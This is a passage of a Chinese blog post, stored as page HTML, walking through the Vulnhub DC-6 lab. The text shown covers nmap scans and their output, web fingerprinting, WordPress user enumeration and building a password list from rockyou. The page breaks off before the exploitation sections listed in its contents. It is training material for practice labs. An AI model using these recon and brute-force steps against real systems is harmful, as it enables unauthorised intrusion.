@@ -1,0 +1,842 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [Vulnhub靶机通关]DC-6 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="[TOC]  前言 我觉得大靶机带给我最大的收获就是整理出一套属于自己的渗透思路，大部分卡住的点也都是信息收集没做到位，所以后面写靶机不会只写关键的点，而是全方位的信息枚举  外网渗透  主机发现+端口扫描 1nmap -sn 192.168.139.141&#x2F;24  定位192.168.139.136为我们的目标靶机 详细信息扫描： 1nmap -sS -T5 -sC -p- --min-rate">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Vulnhub靶机通关]DC-6">
+<meta property="og:url" content="http://example.com/2026/02/19/[Vulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3]DC-6/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="[TOC]  前言 我觉得大靶机带给我最大的收获就是整理出一套属于自己的渗透思路，大部分卡住的点也都是信息收集没做到位，所以后面写靶机不会只写关键的点，而是全方位的信息枚举  外网渗透  主机发现+端口扫描 1nmap -sn 192.168.139.141&#x2F;24  定位192.168.139.136为我们的目标靶机 详细信息扫描： 1nmap -sS -T5 -sC -p- --min-rate">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260219230836032.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260219231101169.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220002558708.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260219233825180.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220000159021.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220001944686.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220001950464.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220002831838.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220002751485.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220003418707.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220005310220.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220005712016.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220010100105.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220010150742.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220010438791.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220010740023.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220010750302.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220010830997.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220011109606.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220011807316.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220012113232.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220012142436.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/202405311948312.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220012454314.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220012629980.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220012849580.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220013037480.png">
+<meta property="og:image" content="http://example.com/2026/02/19/images/image-20260220013105957.png">
+<meta property="article:published_time" content="2026-02-19T13:47:37.000Z">
+<meta property="article:modified_time" content="2026-02-21T16:27:01.641Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="Vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/02/19/images/image-20260219230836032.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="[Vulnhub靶机通关]DC-6">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[Vulnhub靶机通关]DC-6</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text"> 外网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text"> 主机发现+端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E6%94%BEtcp80%E7%AB%AF%E5%8F%A3%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.</span> <span class="toc-text"> 开放TCP80端口详细信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.3.</span> <span class="toc-text"> Web指纹识别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#whatweb%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.3.1.</span> <span class="toc-text"> Whatweb指纹识别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%B1%E6%B4%9E30%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.3.2.</span> <span class="toc-text"> 棱洞3.0指纹识别</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wordpress"><span class="toc-number">2.4.</span> <span class="toc-text"> WordPress</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">2.4.1.</span> <span class="toc-text"> 漏洞扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.4.2.</span> <span class="toc-text"> 用户枚举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E4%B8%8E%E6%96%87%E4%BB%B6%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.4.3.</span> <span class="toc-text"> 目录与文件枚举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8"><span class="toc-number">2.4.4.</span> <span class="toc-text"> 制作密码字典</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wpscan%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="toc-number">2.4.5.</span> <span class="toc-text"> wpscan爆破密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0ping-rce%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.6.</span> <span class="toc-text"> 后台ping RCE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%B9%B6%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.6.1.</span> <span class="toc-text"> 长度限制并绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.4.6.2.</span> <span class="toc-text"> 反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8Fshell"><span class="toc-number">2.4.6.3.</span> <span class="toc-text"> 交互式shell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text"> 后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#graham%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">3.1.</span> <span class="toc-text"> graham密码泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%87%E6%8D%A2jens%E7%94%A8%E6%88%B7jens%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text"> 切换jens用户(jens权限执行任意命令)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83-nmap"><span class="toc-number">3.3.</span> <span class="toc-text"> sudo提权-nmap</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[Vulnhub靶机通关]DC-6" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/02/19/%5BVulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%5DDC-6/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-02-19T13:47:37.000Z" itemprop="datePublished">2026-02-19</time>
+    <time style="display: none;" id="post-update-time">2026-02-22</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/" data-aos="zoom-in">渗透</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>[TOC]</p>
+<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
+<p>我觉得大靶机带给我最大的收获就是整理出一套属于自己的渗透思路，大部分卡住的点也都是信息收集没做到位，所以后面写靶机不会只写关键的点，而是全方位的信息枚举</p>
+<h2 id="外网渗透"><a class="markdownIt-Anchor" href="#外网渗透"></a> 外网渗透</h2>
+<h3 id="主机发现端口扫描"><a class="markdownIt-Anchor" href="#主机发现端口扫描"></a> 主机发现+端口扫描</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.139.141/24</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260219230836032.png" alt="image-20260219230836032" /></p>
+<p>定位<code>192.168.139.136</code>为我们的目标靶机</p>
+<p>详细信息扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T5 -sC -p- --min-rate 10000 192.168.139.136</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260219231101169.png" alt="image-20260219231101169" /></p>
+<p>开了80端口的web服务</p>
+<h3 id="开放tcp80端口详细信息"><a class="markdownIt-Anchor" href="#开放tcp80端口详细信息"></a> 开放TCP80端口详细信息</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p22,80 192.168.13.136 -oA nmapscan/tcpports_Detail</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260220002558708.png" alt="image-20260220002558708" /></p>
+<p>能够得到的信息有：</p>
+<p>端口80：apache/2.4.25；操作系统信息Linux 3.2-4.9</p>
+<p>端口22：openSSH 7.4p1</p>
+<p><img src="../images/image-20260219233825180.png" alt="image-20260219233825180" /></p>
+<p>访问直接跳转到wordy下了，可以知道是由于DNS解析失败导致的，我们就需要在hosts文件中添加指向。<br />
+<img src="../images/image-20260220000159021.png" alt="image-20260220000159021" /></p>
+<p>本地主机上也记得加上：<br />
+<img src="../images/image-20260220001944686.png" alt="image-20260220001944686" /></p>
+<p><img src="../images/image-20260220001950464.png" alt="image-20260220001950464" /></p>
+<p>一个wordpress站</p>
+<h3 id="web指纹识别"><a class="markdownIt-Anchor" href="#web指纹识别"></a> Web指纹识别</h3>
+<h4 id="whatweb指纹识别"><a class="markdownIt-Anchor" href="#whatweb指纹识别"></a> Whatweb指纹识别</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v 192.168.139.136</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260220002831838.png" alt="image-20260220002831838" /></p>
+<p><img src="../images/image-20260220002751485.png" alt="image-20260220002751485" /></p>
+<h4 id="棱洞30指纹识别"><a class="markdownIt-Anchor" href="#棱洞30指纹识别"></a> 棱洞3.0指纹识别</h4>
+<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51577576/article/details/129972804"> 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win）-CSDN博客</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-h    			帮助</span><br><span class="line">-u string			目标网址</span><br><span class="line">-t string			线程（默认为“ 100”）</span><br><span class="line">-l string			基于本地文件探测</span><br><span class="line">-json string		输出 json</span><br><span class="line">-f string			FOFA搜索资产，支持IP和IP段。（192.168.1.1 | 192.168.1.0/24）</span><br><span class="line">-fall string		FOFA批处理搜索IP</span><br><span class="line">-fofa string		FOFA搜索资产，支持所有FOFA搜索语法。</span><br><span class="line">-ftime string		FOFA超时（默认为“ 10”）</span><br><span class="line">-log string		日志文件名（默认“ server.log”）</span><br></pre></td></tr></table></figure>
+<p>扫描目标靶机：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./EHole finger -u http://192.168.139.136</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260220003418707.png" alt="image-20260220003418707" /></p>
+<h3 id="wordpress"><a class="markdownIt-Anchor" href="#wordpress"></a> WordPress</h3>
+<h4 id="漏洞扫描"><a class="markdownIt-Anchor" href="#漏洞扫描"></a> 漏洞扫描</h4>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># nmap -script=vuln -p80 192.168.139.136</span></span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-20 00:35 CST</span><br><span class="line">Nmap scan report for wordy (192.168.139.136)</span><br><span class="line">Host is up (0.00061s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">| http-wordpress-users: </span><br><span class="line">| Username found: admin</span><br><span class="line">| Username found: graham</span><br><span class="line">| Username found: mark</span><br><span class="line">| Username found: sarah</span><br><span class="line">| Username found: jens</span><br><span class="line">|_Search stopped at ID <span class="comment">#25. Increase the upper limit if necessary with &#x27;http-wordpress-users.limit&#x27;</span></span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: <span class="attr">maxdepth</span>=<span class="number">3</span><span class="comment">; maxpagecount=20; withinhost=wordy</span></span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://wordy:80/index.php/about-us/%5C</span><br><span class="line">|     Form id: search-form-1</span><br><span class="line">|     Form action: http://wordy/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://wordy:80/index.php/comments/feed/1quot<span class="comment">;https:/gravatar.com&amp;quot;&amp;gt;Gravatar&amp;lt;/a&amp;gt;.]]</span></span><br><span class="line">|     Form id: search-form-1</span><br><span class="line">|     Form action: http://wordy/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://wordy:80/index.php/contact-us/%5C</span><br><span class="line">|     Form id: search-form-1</span><br><span class="line">|_    Form action: http://wordy/</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli for queries:</span><br><span class="line">|     http://wordy:80/wp-includes/js/jquery/?<span class="attr">C</span>=N%<span class="number">3</span>BO%<span class="number">3</span>DD%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">|     http://wordy:80/wp-includes/js/jquery/?<span class="attr">C</span>=D%<span class="number">3</span>BO%<span class="number">3</span>DA%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">|     http://wordy:80/wp-includes/js/jquery/?<span class="attr">C</span>=M%<span class="number">3</span>BO%<span class="number">3</span>DA%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">|_    http://wordy:80/wp-includes/js/jquery/?<span class="attr">C</span>=S%<span class="number">3</span>BO%<span class="number">3</span>DA%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">| http-enum: </span><br><span class="line">|   /wp-login.php: Possible admin folder</span><br><span class="line">|   /readme.html: Wordpress version: 2 </span><br><span class="line">|   /: WordPress version: 5.1.1</span><br><span class="line">|   /wp-includes/images/rss.png: Wordpress version 2.2 found.</span><br><span class="line">|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.</span><br><span class="line">|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.</span><br><span class="line">|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.</span><br><span class="line">|   /wp-login.php: Wordpress login page.</span><br><span class="line">|   /wp-admin/upgrade.php: Wordpress login page.</span><br><span class="line">|_  /readme.html: Interesting, a readme.</span><br><span class="line">MAC Address: 00:0C:29:29:6F:39 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 32.72 seconds</span><br></pre></td></tr></table></figure>
+<h4 id="用户枚举"><a class="markdownIt-Anchor" href="#用户枚举"></a> 用户枚举</h4>
+<p>根据上面的扫描结果发现以下用户名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- admin（管理员账号）</span><br><span class="line">- graham</span><br><span class="line">- mark  </span><br><span class="line">- sarah</span><br><span class="line">- jens</span><br></pre></td></tr></table></figure>
+<p>或者能用wpscan来枚举</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url wordy -e u</span><br></pre></td></tr></table></figure>
+<h4 id="目录与文件枚举"><a class="markdownIt-Anchor" href="#目录与文件枚举"></a> 目录与文件枚举</h4>
+<p>枚举出以下目录：</p>
+<ul>
+<li><code>/wp-login.php</code> - WordPress登录页面（可进行密码爆破）</li>
+<li><code>/wp-admin/upgrade.php</code> - 升级页面</li>
+<li><code>/readme.html</code> - 包含版本信息的readme文件</li>
+<li><code>/wp-includes/</code> - WordPress核心文件目录</li>
+</ul>
+<p><img src="../images/image-20260220005310220.png" alt="image-20260220005310220" /></p>
+<p>后面的思路就简单了：根据用户制作密码-&gt;登录</p>
+<h4 id="制作密码字典"><a class="markdownIt-Anchor" href="#制作密码字典"></a> 制作密码字典</h4>
+<p>先把用户名添加到字典中：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim user.txt</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">graham</span><br><span class="line">mark</span><br><span class="line">sarah</span><br><span class="line">jens</span><br></pre></td></tr></table></figure>
+<p>题目中给出了提示，告诉了我们密码字典的生成方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CLUE</span><br><span class="line">OK, this isn&#x27;t really a clue as such, but more of some &quot;we don&#x27;t want to spend five years waiting for a certain process to finish&quot; kind of advice for those who just want to get on with the job.</span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; password.txt</span><br></pre></td></tr></table></figure>
+<p>得到密码字典：<br />
+<img src="../images/image-20260220005712016.png" alt="image-20260220005712016" /></p>
